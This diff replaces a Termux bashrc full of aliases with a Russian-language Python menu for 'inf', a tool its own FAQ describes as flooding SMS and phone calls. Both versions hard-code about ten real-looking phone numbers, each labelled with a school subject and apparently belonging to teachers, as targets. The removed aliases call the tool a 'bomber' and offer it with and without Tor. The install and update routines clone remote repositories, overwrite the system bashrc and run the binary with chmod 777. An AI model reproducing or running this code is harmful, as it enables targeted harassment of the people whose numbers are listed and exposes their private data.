@@ -1,120 +1,418 @@
-## Command history tweaks:
-# - Append history instead of overwriting
-#   when shell exits.
-# - When using history substitution, do not
-#   exec command immediately.
-# - Do not save to history commands starting
-#   with space.
-# - Do not save duplicated commands.
-shopt -s histappend
-shopt -s histverify
-export HISTCONTROL=ignoreboth
+import os
+import sys
+import time
+numbers = ['1','2','3','4','5','6','7','8','9']
 
-# Default command line prompt.
-PROMPT_DIRTRIM=2
-PS1='\[\e[0;32m\]\w\[\e[0m\] \[\e[0;97m\]\$\[\e[0m\] '
+def start():
+    os.system('clear')
+    print('''\033[1m
+══════════════════════╗
+[&] Версия inf 2.0    ║
+══════════════════════╣
+[0] Выход             ║
+[1] Обновить          ║
+[2] Установить        ║
+[3] Ручной запуск     ║
+[4] Список контактов  ║
+[5] Настройка запуска ║
+══════════════════════╝\033[m''')
+    command = input('--> ')
+    if command == '1':
+        update()
+    elif command == '2':
+        install()
+    elif command == '3':
+        zapusk()
+    elif command == '4':
+        spisok()
+    elif command == '5':
+        redakt()
+    elif command == '0':
+        print('\033[1m\033[31mВыход из inf...\033[m')
+        time.sleep(1)
+        sys.exit()
+    else:
+        os.system('clear')
+        start()
 
+def update():
+        os.system('clear')
+        print('\033[1m\033[32mОбновление inf...\033[m')
+        time.sleep(2)
+        os.system('cd ~ ; pkg install git ; git clone https://github.com/llll3/inf2.0 ; cd inf2.0 ; mv bash.bashrc ../../usr/etc/ ; source bash.bashrc ; cd ~/inf2.0/inf ; chmod 777 inf ; cd .. ; cd ~ ; yes | pkg update ; yes | pkg upgrade')
+        print('\033[1m\033[32mОбновление завершенно!\033[m')
+        time.sleep(2)
+        start()
 
+def install():
+	os.system('clear')
+	print('\033[1m\033[32mУстановка inf...\033[m')
+	time.sleep(2)
+	os.system('cd ~ ; pkg install git ; git clone https://github.com/llll3/inf2.0 ; cd inf2.0 ; mv bash.bashrc ../../usr/etc/ ; source bash.bashrc ; cd ~/inf2.0/inf ; chmod 777 inf ; cd .. ; cd ~ ; yes | pkg update ; yes | pkg upgrade ; yes | pkg install nano')
+	print('\033[1m\033[32mУстановка завершенна!\033[m')
+	time.sleep(1)
+	start()
 
-##########################################
+def zapusk():
+	os.system('clear')
+	print('\033[1m\033[32mЗапуск inf...\033[m')
+	time.sleep(1)
+	os.system('cd ~ ; cd inf2.0 ; cd inf ; ./inf')
+	exit1()
 
-alias inf='cd && cd inf && chmod 777 inf && ./inf'
-alias inf-tor='cd inf-tor && chmod 777 inf-tor && ./inf-tor'
+def spisok():
+    os.system('clear')
+    print('''\033[1m
+══════════════════════╗
+[&]Список контактов:  ║ \n══════════════════════╣
+[0] Назад             ║
+[1] Информатика       ║
+[2] Английский        ║
+[3] География         ║
+[4] Биология          ║
+[5] Алгебра           ║
+[6] Русский           ║
+[7] История           ║
+[8] Физика            ║
+[9] Химия             ║
+══════════════════════╝\033[m''')
+    global a
+    a = input('--> ')
+    if a == '0':
+       start()
+    if a in numbers:
+        sms()
+    else:
+       spisok()
 
-#бомбер без тора, флуд звонки [2].
-
-alias inf-bio2='cd ~ && cd inf && ./inf 79886100747 2 1 0'
-alias inf-alg2='cd ~ && cd inf && ./inf 79094953366 2 1 0'
-alias inf-geo2='cd ~ && cd inf && ./inf 79283898206 2 1 0'
-alias inf-rus2='cd ~ && cd inf && ./inf 79280265297 2 1 0'
-alias inf-xim2='cd ~ && cd inf && ./inf 79283960564 2 1 0'
-alias inf-fiz2='cd ~ && cd inf && ./inf 79283949290 2 1 0'
-alias inf-ist2='cd ~ && cd inf && ./inf 79631702053 2 1 0'
-alias inf-ang2='cd ~ && cd inf && ./inf 79283920417 2 1 0'
-alias inf-tex2='cd ~ && cd inf && ./inf 79283968782 2 1 0'
-alias inf-inf2='cd ~ && cd inf && ./inf 79283984241 2 1 0'
-
-#бомбер с тором, флуд звонки [2].
-
-alias inftor-bio2='cd ~ && cd inf-tor && ./inf-tor 79886100747 2 1 0'
-alias inftor-alg2='cd ~ && cd inf-tor && ./inf-tor 79094953366 2 1 0'
-alias inftor-geo2='cd ~ && cd inf-tor && ./inf-tor 79283898206 2 1 0'
-alias inftor-rus2='cd ~ && cd inf-tor && ./inf-tor 79280265297 2 1 0'
-alias inftor-xim2='cd ~ && cd inf-tor && ./inf-tor 79283960564 2 1 0'
-alias inftor-fiz2='cd ~&& cd inf-tor && ./inf-tor 79283949290 2 1 0'
-alias inftor-ist2='cd ~ && cd inf-tor && ./inf-tor 79631702053 2 1 0'
-alias inftor-ang2='cd ~ && cd inf-tor && ./inf-tor 79283920417 2 1 0'
-alias inftor-tex2='cd ~ && cd inf-tor && ./inf-tor 79283968782 2 1 0'
-alias inftor-inf2='cd ~ && cd inf-tor && ./inf-tor 79283984241 2 1 0'
-
-#бомбер с тором, флуд смс [1].
-
-alias inftor-bio1='cd ~ && cd inf-tor && ./inf-tor 79886100747 1 1 0'
-alias inftor-xim1='cd ~ && cd inf-tor && ./inf-tor 79283960564 1 1 0'
-alias inftor-alg1='cd ~ && cd inf-tor && ./inf-tor 79094953366 1 1 0'
-alias inftor-geo1='cd ~ && cd inf-tor && ./inf-tor 79283898206 1 1 0'
-alias inftor-rus1='cd ~ && cd inf-tor && ./inf-tor 79280265297 1 1 0'
-alias inftor-fiz1='cd ~ && cd inf-tor && ./inf-tor 79283949290 1 1 0'
-alias inftor-ist1='cd ~ && cd inf-tor && ./inf-tor 79631702053 1 1 0'
-alias inftor-ang1='cd ~ && cd inf-tor && ./inf-tor 79283920417 1 1 0'
-alias inftor-tex1='cd ~ && cd inf-tor && ./inf-tor 79283968782 1 1 0'
-alias inftor-inf1='cd ~ && cd inf-tor && ./inf-tor 79283984241 1 1 0'
-
-#бомбер без тора смс [1].
-
-alias inf-bio1='cd ~ && cd inf && ./inf 79886100747 1 1 0'
-alias inf-alg1='cd ~ && cd inf && ./inf 79094953366 1 1 0'
-alias inf-geo1='cd ~ && cd inf && ./inf 79283898206 1 1 0'
-alias inf-rus1='cd ~ && cd inf && ./inf 79280265297 1 1 0'
-alias inf-xim1='cd ~ && cd inf && ./inf 79283960564 1 1 0'
-alias inf-fiz1='cd ~ && cd inf && ./inf 79283949290 1 1 0'
-alias inf-ist1='cd ~ && cd inf && ./inf 79631702053 1 1 0'
-alias inf-ang1='cd ~ && cd inf && ./inf 79283920417 1 1 0'
-alias inf-tex1='cd ~ && cd inf && ./inf 79283968782 1 1 0'
-alias inf-inf1='cd ~ && cd inf && ./inf 79283984241 1 1 0'
-
-#флуд без тора [3].
- 
-alias inf-bio3='cd ~ && cd inf && ./inf 79886100747 3 1 0'
-alias inf-alg3='cd ~ && cd inf && ./inf 79094953366 3 1 0'
-alias inf-geo3='cd ~ && cd inf && ./inf 79283898206 3 1 0'
-alias inf-rus3='cd ~ && cd inf && ./inf 79280265297 3 1 0'
-alias inf-xim3='cd ~ && cd inf && ./inf 79283960564 3 1 0'
-alias inf-fiz3='cd ~ && cd inf && ./inf 79283949290 3 1 0'
-alias inf-ist3='cd ~ && cd inf && ./inf 79631702053 3 1 0'
-alias inf-ang3='cd ~ && cd inf && ./inf 79283920417 3 1 0'
-alias inf-tex3='cd ~ && cd inf && ./inf 79283968782 3 1 0'
-alias inf-inf3='cd ~ && cd inf && ./inf 79283984241 3 1 0'
-
-#флуд с тором [3].
-
-alias inftor-bio3='cd ~ && cd inf-tor && ./inf-tor 79886100747 3 1 0'
-alias inftor-alg3='cd ~ && cd inf-tor && ./inf-tor 79094953366 3 1 0'
-alias inftor-geo3='cd ~ && cd inf-tor && ./inf-tor 79283898206 3 1 0'
-alias inftor-rus3='cd ~ && cd inf-tor && ./inf-tor 79280265297 3 1 0'
-alias inftor-xim3='cd ~ && cd inf-tor && ./inf-tor 79283960564 3 1 0'
-alias intorf-fiz3='cd ~ && cd inf-tor && ./inf-tor 79283949290 3 1 0'
-alias inftor-ist3='cd ~ && cd inf-tor && ./inf-tor 79631702053 3 1 0'
-alias inftor-ang3='cd ~ && cd inf-tor && ./inf-tor 79283920417 3 1 0'
-alias inftor-tex3='cd ~ && cd inf-tor && ./inf-tor 79283968782 3 1 0'
-alias inftor-inf3='cd ~ && cd inf-tor && ./inf-tor 79283984241 3 1 0'
-
-#################################################
+def redakt():
+	os.system('clear')
+	print('\033[1m')
+	print('[&]Меню редактирования контактов\n')
+	print('[&]Выберите контакт:')
+	print('[0] Назад')
+	print('[1] {name}')
+	kon = input('--> ')
+	if kon == '0':
+		start()
+	else:
+		redakt()
 
 
-alias gadd='git add -A'
-alias gcom='git commit -m "qwerty"'
-alias gpush='git push origin main'
-alias gsave='gadd ; gcom ; gpush'
-alias inf2.0='cd ~ ; cd inf2.0 ; py inf2.0.py'
-alias py='python3'
-alias inf-update='cd ~ ; cd ../usr/etc/ ; rm -r bash.bashrc -f ; rm -r bash -f ; git clone https://github.com/llll3/bash ; cd bash ; mv bash.bashrc .. ; source ../usr/etc/bash.bashrc ; infhub ; yes | !!'
-alias inf-upgrade='cd ~ ; cd ../usr/etc/ ; rm -r bash.bashrc -f ; rm -r bash -f ; git clone https://github.com/llll3/bash ; cd bash ; mv bash.bashrc .. ; source ../usr/etc/bash.bashrc ; infhub ; yes | !!'
-alias del-bash='cd ~ ; rm -r ../usr/etc/bash.bashrc -f'
-alias cd-bash='cd ~ ; cd ../usr/etc'
-alias nano-bash='cd ~ ; nano ../usr/etc/bash.bashrc'
-alias ll='ls -a'
-alias ls='ls --color=auto'
-alias lsa='ls -a'
-alias sgc='sudo git clone'
-alias infhub='cd .. ; rm -r bash -f && yes | pkg update ; yes | pkg upgrade ; yes | pkg install nano ; yes | pkg install python ; yes | pkg install python2 ; yes | pkg install python3 ; cd ~ ; git clone https://github.com/llll3/inf ; cd inf ; rm -r .git -f ; chmod 777 inf ; ./inf'
+def faq():
+	os.system('clear')
+	print('''\033[1m
+═══════════════════════════════════════════════╗
+[&] F.A.Q:                                     ║\n═══════════════════════════════════════════════╣
+[0] Назад.                                     ║
+[1] SMS - начинает флудить смс'ками.           ║
+[2] CALL - начинает флудить звон'ками.         ║
+[3] SMS и CALL - включает в себя 1 и 2 пункт.  ║
+═══════════════════════════════════════════════╝\033[m''')
+	ww = input('--> ')
+	if ww == '0':
+		sms()
+	else:
+	    faq()
+
+
+
+
+
+
+
+
+
+def sms():
+     os.system('clear')
+     print('''\033[1m
+══════════════════════╗
+[&]Выбирите режим:    ║\n══════════════════════╣
+[0] Назад             ║
+[1] Флуд SMS          ║
+[2] Флуд CALL         ║
+[3] CALL и SMS        ║
+[4] F.A.Q             ║
+══════════════════════╝\033[m''')
+     b = input('--> ')
+     if b == '0':
+     	spisok()
+     if b == '4':
+     	faq()
+     if a == '1' and  b == '1':
+         inf1()
+     elif a == '1' and b == '2':
+         inf2()
+     elif a == '1' and b == '3':
+         inf3()
+        	###########inf1
+     if a == '2' and b == '1':
+        	#########ang2
+         ang1()
+     elif a == '2' and b == '2':
+     	ang2()
+     elif a == '2' and b == '3':
+     	ang3()
+        	###########ang2
+     if a == '3' and b == '1':
+        	###########geo3
+     	geo1()
+     elif a == '3' and b == '2':
+     	geo2()
+     elif a == '3' and b == '3':
+     	geo3()
+         	##########geo3
+     if a == '4' and b == '1':
+        	#########bio4
+     	bio1()
+     elif a == '4' and b == '2':
+     	bio2()
+     elif a == '4' and b == '3':
+     	bio3()
+    	###########bio4
+     if a == '5' and b == '1':
+        	#########alg5
+     	alg1()
+     elif a == '5' and b == '2':
+     	alg2()
+     elif a == '5' and b == '3':
+     	alg3()
+        	###########alg5
+     if a == '6' and b == '1':
+        	#########rus6
+     	rus1()
+     elif a == '6' and b == '2':
+     	rus2()
+     elif a == '6' and b == '3':
+     	rus3()
+        	############rus6
+     if a == '7' and b == '1':
+        	#########ist7
+     	ist1()
+     elif a == '7' and b == '2':
+     	ist2()
+     elif a == '7' and b == '3':
+     	ist3()
+        	###########ist7
+     if a == '8' and b == '1':
+        	#########fiz8
+         fiz1()
+     elif a == '8' and b == '2':
+         fiz2()
+     elif a == '8' and b == '3':
+         fiz3()
+        	###########fiz8
+     if a == '9' and b == '1':
+        	#########xim9
+          xim1()
+     elif a == '9' and b == '2':
+          xim2()
+     elif a == '9' and b == '3':
+      	xim3()
+        	###########xim9
+     else:
+          sms()
+
+def exit1():
+    os.system('clear')
+    ee = input('\033[1m\nВыйти в главное меню?(\033[32myes\033[m\033[1m/\033[31mno\033[m\033[1m): ')
+    if ee == 'y' or ee == 'yes':
+        start()
+    elif ee == 'n' or ee == 'no':
+        sys.exit()
+    else:
+        exit1()
+
+
+############inf1
+def inf1():
+	os.system('clear')
+	print('\033[1m\033[32mЗапуск inf....\033[m')
+	time.sleep(1)
+	inf1= os.system('cd ~ ; cd inf2.0 ; cd inf ; ./inf 79283984241 1 1 0')
+	exit1()
+def inf2():
+	os.system('clear')
+	print('\033[1m\033[32mЗапуск inf....\033[m')
+	time.sleep(1)
+	inf2 = os.system('cd ~ && cd inf2.0 && cd inf && ./inf 79283984241 2 1 0')
+	exit1()
+def inf3():
+	os.system('clear')
+	print('\033[1m\033[32mЗапуск inf....\033[m')
+	time.sleep(1)
+	inf3 = os.system('cd ~ && cd inf2.0 && cd inf && ./inf 79283984241 3 1 0')
+	exit1()
+############inf1
+##############
+###########ang2
+def ang1():
+	os.system('clear')
+	print('\033[1m\033[32mЗапуск inf....\033[m')
+	time.sleep(1)
+	ang1 = os.system('cd ~ && cd inf2.0 && cd inf && ./inf 79283920417 1 1 0')
+	exit1()
+def ang2():
+	os.system('clear')
+	print('\033[1m\033[32mЗапуск inf....\033[m')
+	time.sleep(1)
+	ang2 = os.system('cd ~ && cd inf2.0 && cd inf && ./inf 79283920417 2 1 0')
+	exit1()
+def ang3():
+	os.system('clear')
+	print('\033[1m\033[32mЗапуск inf....\033[m')
+	time.sleep(1)
+	ang = os.system('cd ~ && cd inf2.0 && cd inf && ./inf 79283920417 3 1 0')
+	exit1()
+##########ang2
+#############
+##########geo3
+def geo1():
+	os.system('clear')
+	print('\033[1m\033[32mЗапуск inf....\033[m')
+	time.sleep(1)
+	geo1 = os.system('cd ~ && cd inf2.0 && cd inf && ./inf 79283898206 1 1 0')
+	exit1()
+def geo2():
+	os.system('clear')
+	print('\033[1m\033[32mЗапуск inf....\033[m')
+	time.sleep(1)
+	geo2 = os.system('cd ~ && cd inf2.0 && cd inf && ./inf 79283898206 2 1 0')
+	exit1()
+def geo3():
+	os.system('clear')
+	print('\033[1m\033[32mЗапуск inf....\033[m')
+	time.sleep(1)
+	geo3 = os.system('cd ~ && cd inf2.0 && cd inf && ./inf 79283898206 3 1 0')
+	exit1()
+##########geo3
+#############
+##########bio4
+def bio1():
+	os.system('clear')
+	print('\033[1m\033[32mЗапуск inf....\033[m')
+	time.sleep(1)
+	bio1 = os.system('cd ~ && cd inf2.0 && cd inf && ./inf 79886100747 1 1 0')
+	exit1()
+def bio2():
+	os.system('clear')
+	print('\033[1m')
+	print('Запуск inf....')
+	time.sleep(1)
+	bio2 = os.system('cd ~ && cd inf2.0 && cd inf && ./inf 79886100747 2 1 0')
+	exit1()
+def bio3():
+	os.system('clear')
+	print('\033[1m\033[32mЗапуск inf....\033[m')
+	time.sleep(1)
+	bio3 = os.system('cd ~ && cd inf2.0 && cd inf && ./inf 79886100747 3 1 0')
+	exit1()
+##########bio4
+#############
+##########alg5
+def alg1():
+	os.system('clear')
+	print('\033[1m\033[32mЗапуск inf....\033[m')
+	time.sleep(1)
+	alg1 = os.system('cd ~ && cd inf2.0 && cd inf && ./inf 79094953366 1 1 0')
+	exit1()
+def alg2():
+	os.system('clear')
+	print('\033[1m\033[32mЗапуск inf....\033[m')
+	time.sleep(1)
+	alg2 = os.system('cd ~ && cd inf2.0 && cd inf && ./inf 79094953366 2 1 0')
+	exit1()
+def alg3():
+	os.system('clear')
+	print('\033[1m\033[32mЗапуск inf....\033[m')
+	time.sleep(1)
+	alg3 = os.system('cd ~ && cd inf2.0 && cd inf && ./inf 79094953366 3 1 0')
+	exit1()
+##########alg5
+##############
+##########rus6
+def rus1():
+	os.system('clear')
+	print('\033[1m\033[32mЗапуск inf....\033[m')
+	time.sleep(1)
+	rus1 = os.system('cd ~ && cd inf2.0 && cd inf && ./inf 79280265297 1 1 0')
+	exit1()
+def rus2():
+	os.system('clear')
+	print('\033[1m\033[32mЗапуск inf....\033[m')
+	time.sleep(1)
+	alg2 = os.system('cd ~ && cd inf2.0 && cd inf && ./inf 79094953366 2 1 0')
+	exit1()
+def rus3():
+	os.system('clear')
+	print('\033[1m\033[32mЗапуск inf....\033[m')
+	time.sleep(1)
+	alg3 = os.system('cd ~ && cd inf2.0 && cd inf && ./inf 79094953366 3 1 0')
+	exit1()
+##########rus6
+#############
+##########ist7
+def ist1():
+	os.system('clear')
+	print('\033[1m\033[32mЗапуск inf....\033[m')
+	time.sleep(1)
+	ist1 = os.system('cd ~ && cd inf2.0 && cd inf && ./inf 79631702053 1 1 0')
+	exit1()
+def ist2():
+	os.system('clear')
+	print('\033[1m\033[32mЗапуск inf....\033[m')
+	time.sleep(1)
+	ist2 = os.system('cd ~ && cd inf2.0 && cd inf && ./inf 79631702053 2 1 0')
+	exit1()
+def ist3():
+	os.system('clear')
+	print('\033[1m\033[32mЗапуск inf....\033[m')
+	time.sleep(1)
+	ist3 = os.system('cd ~ && cd inf2.0 && cd inf && ./inf 79631702053 3 1 0')
+	exit1()
+##########ist7
+############
+##########fiz8
+def fiz1():
+	os.system('clear')
+	print('\033[1m\033[32mЗапуск inf....\033[m')
+	time.sleep(1)
+	fiz1= os.system('cd ~ && cd inf2.0 && cd inf && ./inf 79283949290 1 1 0')
+	exit1()
+def fiz2():
+	os.system('clear')
+	print('\033[1m\033[32mЗапуск inf....\033[m')
+	time.sleep(1)
+	fiz2 = os.system('cd ~ && cd inf2.0 && cd inf && ./inf 79283949290 2 1 0')
+	exit1()
+def fiz3():
+	os.system('clear')
+	print('\033[1m\033[32mЗапуск inf....\033[m')
+	time.sleep(1)
+	fiz3 = os.system('cd ~ && cd inf2.0 && cd inf && ./inf 79283949290 3 1 0')
+	exit1()
+##########fiz8
+#############
+##########xim9
+def xim1():
+	os.system('clear')
+	print('\033[1m\033[32mЗапуск inf....\033[m')
+	time.sleep(1)
+	xim1 = os.system('cd ~ && cd inf2.0 && cd inf && ./inf 79283960564 1 1 0')
+	exit1()
+def xim2():
+	os.system('clear')
+	print('\033[1m\033[32mЗапуск inf....\033[m')
+	time.sleep(1)
+	xim2= os.system('cd ~ && cd inf2.0 && cd inf && ./inf 79283960564 2 1 0')
+	exit1()
+def xim3():
+	os.system('clear')
+	print('\033[1m\033[32mЗапуск inf....\033[m')
+	time.sleep(1)
+	xim3 = os.system('cd ~ && cd inf2.0 && cd inf && ./inf 79283960564 3 1 0')
+	exit1()
+##########xim9
+
+
+start()
